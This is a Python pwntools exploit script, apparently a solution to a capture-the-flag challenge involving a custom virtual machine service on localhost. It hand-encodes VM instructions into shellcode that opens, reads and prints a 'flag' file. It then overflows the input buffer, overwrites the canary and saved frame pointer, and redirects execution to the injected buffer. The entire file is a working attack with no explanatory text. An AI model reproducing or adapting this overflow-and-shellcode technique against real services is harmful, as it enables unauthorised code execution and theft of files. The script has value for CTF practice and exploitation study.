from pwn import *

p = remote("localhost",3000)

TYPE_R = 0
TYPE_I = 1

def p14(data):
	dat = data
	data = chr((dat & 0b11111110000000) >> 7)
	data += chr((dat & 0b00000001111111))
	return data

def p21(data):
	dat = data
	data =  chr((dat&0b000000000000001111111))
	data += chr((dat&0b111111100000000000000) >> 14)
	data += chr((dat&0b000000011111110000000) >> 7)
	return data

def dispatch(op,op_type,opers):
	ori_op_type = op_type

	op = op << 9
	op_type = op_type << 8
	opers[0]  = opers[0]<< 4

	if ori_op_type == TYPE_R:
		opers[1] = (opers[1] & 0b00000000001111)
		return p14(op+op_type+opers[0]+opers[1])
		op_size = 2
	elif ori_op_type == TYPE_I:
		return p14(op|op_type|opers[0])+p21(opers[1])
		op_size = 5
	else:
		print("[VM] Invalid instruction")
		exit(1)

BUF_ADDR = 1007518
FLAG_ADDR = 1007518 + 52

pay  = dispatch(4,1,[0,1]) #mov r0 , 1
pay += dispatch(4,1,[1,FLAG_ADDR]) #mov r1 , flag_pos
pay += dispatch(0x8,1,[1,1]) #syscall (r0 == 1 , open)


pay += dispatch(4,0,[1,0]) #mov r1 , r0 (fd == open_flag_fd)
pay += dispatch(4,1,[2,BUF_ADDR]) #mov r2 , 1007518 # buf 
pay += dispatch(4,1,[3,30]) #mov r3 , 30 # size

pay += dispatch(4,1,[0,3]) #mov r0 , 3
pay += dispatch(0x8,1,[1,1]) #syscall (r0 == 3 , read)

pay += dispatch(4,1,[1,1]) #mov r1 , r0 (fd == write_fd)
pay += dispatch(4,1,[0,2]) #mov r0 , 2
pay += dispatch(0x8,1,[1,1]) #syscall (r0 == 2 , write)
pay += "flag\x00"

pay = pay.ljust(57,"A")
pay += p21(0x12345) #canary
pay += "how" #ebp
pay += p21(BUF_ADDR) #input

open("firm_chk","w").write(pay)
print(hexdump(pay))

p.sendlineafter(">",pay)
p.interactive()
